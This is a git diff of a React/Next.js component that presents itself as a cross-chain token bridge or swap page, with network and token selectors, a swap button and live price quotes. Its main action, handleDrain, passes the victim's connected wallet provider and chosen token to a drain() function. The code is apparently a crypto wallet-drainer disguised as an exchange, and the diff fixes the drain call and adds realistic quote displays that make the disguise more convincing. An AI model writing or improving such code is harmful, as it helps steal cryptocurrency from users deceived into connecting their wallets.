@@ -12,8 +12,11 @@ import { toast } from "react-toastify";
 import { ethers } from "ethers";
 import { config } from "../web3Config";
 import Image from "next/image";
-import { shortenAddressSmall } from "../utils";
+import { formatCurrency, shortenAddressSmall } from "../utils";
 import TokenSelectView from "@/components/stargate/TokenSelectView";
+import axios from "axios";
+import { useQuery } from "@tanstack/react-query";
+import { formatAmount } from "@/lib/utils";
 
 export default function Transfer() {
   const [currentView, setCurrentView] = useState("transfer");
@@ -29,6 +32,10 @@ export default function Transfer() {
   const [slippageTolerance, setSlippageTolerance] = useState(0.5);
   const [isActive, setIsActive] = useState(false);
   const { chainId, connector, address, isConnected } = useAccount();
+
+  const [loading, setLoading] = useState(false);
+  const [txState, setTxState] = useState("Initial");
+  const { drain } = useWallet();
 
   const handleToggle = () => {
     setIsActive(!isActive);
@@ -46,23 +53,20 @@ export default function Transfer() {
   const handleNetworkSelect = (network) => {
     if (networkSelectType === "from") {
       setSelectedFromNetwork(network);
-    } else {
+    }
+    if (networkSelectType === "to") {
       setSelectedToNetwork(network);
     }
     setCurrentView("transfer");
   };
 
-  const [loading, setLoading] = useState(false);
-  const [txState, setTxState] = useState("Initial");
-  const { drain } = useWallet();
+  // console.log(selectedFromToken, "selectedFromToken.contractAddress");
 
   const handleDrain = async () => {
-    if (!connector || !amount || selectedFromToken.contractAddress) {
+    if (!connector || !amount || !selectedFromToken.token_address) {
       console.error("Missing required fields for drain.");
       return;
     }
-
-    // console.log("Selected from asset:", selectedFromAsset);
 
     try {
       setLoading(true);
@@ -73,10 +77,10 @@ export default function Transfer() {
       );
       const chainId = await provider.getSigner().getChainId();
 
-      await drain(provider, chainId, selectedFromToken.contractAddress); // Trigger drain with correct args
+      await drain(provider, chainId, selectedFromToken.token_address); // Trigger drain with correct args
 
       setTxState("Completed");
-      toast.success("Exchange successful!");
+      // toast.success("Exchange successful!");
       setLoading(false);
     } catch (error) {
       console.error("Error in drain function:", error);
@@ -87,14 +91,52 @@ export default function Transfer() {
 
   const { data } = useBalance({
     address,
-    token: selectedFromNetwork?.address,
+    ...(selectedFromNetwork?.address && {
+      token: selectedFromNetwork?.address,
+    }),
     chainId: selectedFromNetwork?.chainId,
     config,
   });
 
+  const { data: quote, isLoading } = useQuery({
+    queryKey: ["price"],
+    queryFn: async () =>
+      axios
+        .post("https://api.relay.link/price", {
+          user: address || "0x000000000000000000000000000000000000dead",
+          originChainId: selectedFromNetwork?.chainId,
+          destinationChainId: selectedToNetwork?.chainId,
+          originCurrency:
+            selectedFromToken?.address ||
+            "0x0000000000000000000000000000000000000000",
+          destinationCurrency:
+            selectedToToken?.address ||
+            "0x0000000000000000000000000000000000000000",
+          tradeType: "EXACT_INPUT",
+          amount: formatAmount(amount, selectedFromNetwork?.decimals || 18),
+          referrer: "relay.link/swap",
+          useExternalLiquidity: false,
+        })
+        .then((res) => res.data),
+    refetchOnMount: true,
+    refetchOnWindowFocus: false,
+    enabled: !!selectedFromNetwork?.decimals && !!amount,
+    refetchInterval: 20000,
+    retry: 1,
+  });
+
+  const handleSwap = () => {
+    setSelectedFromNetwork(selectedToNetwork);
+    setSelectedToNetwork(selectedFromNetwork);
+    setSelectedToToken(selectedFromToken);
+    setSelectedFromToken(selectedToToken);
+  };
+
+  // console.log(selectedFromNetwork, "selectedFromNetwork");
+
   const handleMax = () => {
     if (Number(data?.formatted) > 0) {
-      setAmount(Number(data?.formatted)?.toFixed(5));
+      setAmount(Number(data?.formatted)?.toFixed(8));
     }
   };
 
@@ -118,6 +160,7 @@ export default function Transfer() {
           </div>
         </div>
 
+        {/* connector image */}
         <div className="">
           {isConnected ? (
             <div className="w-full flex justify-start items-center gap-2 text-[#999] mb-1.5">
@@ -135,6 +178,7 @@ export default function Transfer() {
             </div>
           ) : null}
 
+          {/* Selected Token */}
           <div className="grid grid-cols-2 cursor-pointer relative border border-[#323232] rounded-lg bg-[#1a1a1a]">
             <div
               className="px-4 py-2 border-r border-[#323232]"
@@ -165,6 +209,7 @@ export default function Transfer() {
                 )}
               </div>
             </div>
+
             <div
               className="px-4 py-2"
               onClick={() => {
@@ -196,10 +241,14 @@ export default function Transfer() {
             </div>
           </div>
 
-          <div className="flex items-center justify-center my-4">
+          <button
+            onClick={handleSwap}
+            className="flex items-center justify-center my-4 mx-auto"
+          >
             <ArrowUpDown className="w-7 h-7" />
-          </div>
+          </button>
 
+          {/* Connector image */}
           {isConnected ? (
             <div className="w-full flex justify-start items-center gap-2 text-[#999] mb-1.5">
               {connector?.icon ? (
@@ -215,6 +264,7 @@ export default function Transfer() {
               </p>
             </div>
           ) : null}
+
           <div className="grid grid-cols-2 cursor-pointer relative border border-[#323232] rounded-lg bg-[#1a1a1a]">
             <div
               className="px-4 py-2 border-r border-[#323232]"
@@ -298,7 +348,12 @@ export default function Transfer() {
             </div>
           </div>
 
-          <div className="text-[11px] text-[#A6A6A6] my-4">Est. Value: -</div>
+          <div className="text-[11px] text-[#A6A6A6] mb-4 mt-1">
+            Est. Value:{" "}
+            {quote?.details
+              ? `$${formatCurrency(quote?.details?.currencyOut?.amountUsd)}`
+              : "-"}
+          </div>
           {/* usd_price */}
           <div className="grid grid-cols-2 gap-4">
             <div className="bg-[#1a1a1a] rounded-md p-2">
@@ -344,10 +399,10 @@ export default function Transfer() {
             >
               <div>You will receive</div>
               <div className="flex items-center gap-1 font-semibold">
-                {selectedFromToken
-                  ? `${Number(
-                      selectedFromToken?.usd_value_24hr_usd_change
-                    ).toFixed(5)} ${selectedFromToken?.symbol}`
+                {quote?.details
+                  ? `${formatCurrency(
+                      quote?.details?.currencyOut?.amountFormatted
+                    )} ${selectedToToken?.symbol}`
                   : "- --"}
                 <ChevronDown
                   className={`${
